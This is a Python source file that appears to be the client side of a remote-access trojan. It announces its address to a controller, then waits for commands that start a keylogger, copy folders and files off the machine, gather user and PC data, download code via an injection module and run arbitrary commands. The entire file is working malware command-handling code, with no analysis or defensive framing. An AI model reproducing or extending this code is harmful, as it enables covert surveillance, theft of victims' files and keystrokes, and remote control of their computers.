import socket
import userscanner
import keylogger
import getuser_pc
import github_inject

# TODO Make these credentials into ones automatically generated by the OS   
HOST_IP = "127.0.0.1"
HOST_PORT = 12345
# TODO send IP and Port information to the server beacuze we dont actually know how to connect to the CLI

def send_Ip_Port():
    while True:
        try:
            cli_ip = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            cli_ip.connect(("127.0.0.1", 44404))
            msg = f"{HOST_IP};{HOST_PORT}"
            cli_ip.send(bytes(msg, "utf-8"))
            break
        except:
            print("Server offline.")
    while True:
        msg = cli_ip.recv(128).decode("utf-8")
        if msg == "continue": 
            start_client()


def start_client():
    while True:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as main_s:
                print("0: client.py started")
                main_s.bind(("127.0.0.1", 12345))
                print("1: bound the ip and port")
                main_s.listen(1)
                print("2: listening")
                conn, addr = main_s.accept()
                print(f"3: accepted {addr}")
                with conn:
                    while True:
                        try:
                            data = conn.recv(64).decode("utf-8") 
                        except: 
                            print("Server disconnected attempting reconnection.")
                            break
                        # The command section:
                        if data:
                            match data:
                                case "run -keylogger":
                                    data = ""
                                    print("Client Started the keylogger.")
                                    print("Command: ", {data})
                                    keylogger.start_keylogger()
    
                                # To je kokotské implementovanie, ale nemusím 500 if dávať
                                case data if "run -gf" == data:
                                    data = ""
                                    print("Client Started the Folder Transfer.")
                                    print("Command: ", {data})
                                    userscanner.start_FolderData(data)
    
                                case data if "run -gfc" in data:
                                    data = ""
                                    print("Client Started the FileTransfer.")
                                    print("Command: ", {data})
                                    userscanner.start_sendFiles(data)
                                    data = ""
                                    
                                case "run -gatherData":
                                    getuser_pc.startGathering()
                                    print("Gathering Data")
                                    data=""

                                case "run -injectCode":
                                    github_inject.start_downloading()
                                    print("Injecting code")
                                    data = ""

                                case data if "run -cmd" in data:
                                    github_inject.run_cmd_code(data)
                                    data=""
                                    print("Code executed")
def startGmsSocket():
    pass
                                    

if __name__ == "__main__":
    send_Ip_Port()